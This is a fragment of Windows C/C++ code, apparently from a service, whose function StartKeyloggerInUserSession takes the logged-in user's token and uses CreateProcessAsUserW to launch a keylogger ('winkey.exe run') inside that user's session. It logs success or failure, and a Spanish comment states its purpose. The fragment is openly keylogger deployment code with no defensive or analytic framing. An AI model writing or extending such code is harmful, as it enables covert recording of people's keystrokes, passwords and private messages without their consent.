...
void StartKeyloggerInUserSession() {
    ...
    if (WTSQueryUserToken(sessionId, &hToken)) {
        ...
        wchar_t command[] = L"winkey.exe run";  // Ejecuta el keylogger en la sesión del usuario

        if (!CreateProcessAsUserW(hToken, NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            logError(L"Failed to start keylogger in user session. Error: %lu\n", GetLastError());
        } else {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            logStartup(L"Keylogger started in user session.\n");
        }
        CloseHandle(hToken);
    } else {
        logError(L"Failed to get user token for session: %lu\n", GetLastError());
    }
}
